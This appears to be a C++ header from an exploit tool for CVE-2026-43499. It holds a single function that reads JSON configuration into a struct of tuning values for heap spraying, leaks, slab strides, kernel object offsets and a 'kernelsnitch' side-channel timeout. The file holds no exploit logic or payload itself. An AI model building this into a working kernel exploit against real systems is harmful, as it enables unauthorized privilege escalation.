#pragma once
/** @file backend/cve_2026_43499/steps/prepare_values_from_wire.hpp
 *  Reading the preparation values out of the wire.
 *
 *  Moved out of the launcher (2026-10-12 ruling: the launcher launches). The body is
 *  byte for byte the one that lived there; only the name changed, so it says which
 *  side of the wire it reads.
 */
#include "backend/cve_2026_43499/steps/prepare_mapping.hpp"
#include "script/wire_doc.hpp"

namespace ghostlock::backend::cve_2026_43499::steps {
    void read_prepare_values_from_wire(const script::WireDoc &doc, PrepareValues &values) noexcept {
        struct Slot final {
            const char *input;
            std::uint64_t *value;
        };
        const Slot slots[] = {
            {"snitch_collisions", &values.snitch_collisions},
            {"snitch_threads", &values.snitch_threads},
            {"futex_table_size", &values.futex_table_size},
            {"mm_struct_sz", &values.mm_struct_sz},
            {"region_threads", &values.region_threads},
            {"snitch_round_wait_us", &values.snitch_round_wait_us},
            {"snitch_wake_rounds", &values.snitch_wake_rounds},
            {"prepare_max_attempts", &values.prepare_max_attempts},
            {"prepare_timeout_ms", &values.prepare_timeout_ms},
            {"kernelsnitch_timeout_ms", &values.kernelsnitch_timeout_ms},
            {"setup_settle_us", &values.setup_settle_us},
            {"state_poll_interval_us", &values.state_poll_interval_us},
            {"route_wait_ms", &values.route_wait_ms},
            {"route_done_timeout_ms", &values.route_done_timeout_ms},
            {"waiter_offset", &values.waiter_offset},
            {"task_offset", &values.task_offset},
            {"lock_offset", &values.lock_offset},
            {"buffer_size", &values.buffer_size},
            {"page_size", &values.page_size},
            {"header_bytes", &values.header_bytes},
            {"region_size", &values.region_size},
            {"object_size", &values.object_size},
            {"total_pokes", &values.total_pokes},
            {"pre_groups", &values.pre_groups},
            {"spray_groups", &values.spray_groups},
            {"post_groups", &values.post_groups},
            {"leak_groups", &values.leak_groups},
            {"word_bytes", &values.word_bytes},
            {"handle_bytes", &values.handle_bytes},
            {"coarse_stride", &values.coarse_stride},
            {"slab_stride", &values.slab_stride},
            {"mm_objs_per_slab", &values.mm_objs_per_slab},
            {"shaped", &values.shaped},
            {"socket_buffer", &values.socket_buffer},
            {"send_size", &values.send_size},
        };
        for (const Slot &slot : slots) {
            for (std::size_t i = 0U; i < kPrepareInputKeyCount; ++i) {
                const PrepareInputKey &row = kPrepareInputKeys[i];
                if (row.wire_key == nullptr || std::strcmp(row.input, slot.input) != 0) { continue; }
                const script::JsonNode *node = doc.find(row.wire_key);
                std::uint64_t value = 0U;
                if (node == nullptr) { continue; }
                /* 数字与 0x 串走 u64_of；bool 也算数（shaped 就是 bool）。 */
                bool boolean = false;
                if (doc.u64_of(*node, value)) {
                    *slot.value = value;
                } else if (doc.bool_of(*node, boolean)) {
                    *slot.value = boolean ? 1U : 0U;
                }
            }
        }
    }
}  // namespace ghostlock::backend::cve_2026_43499::steps
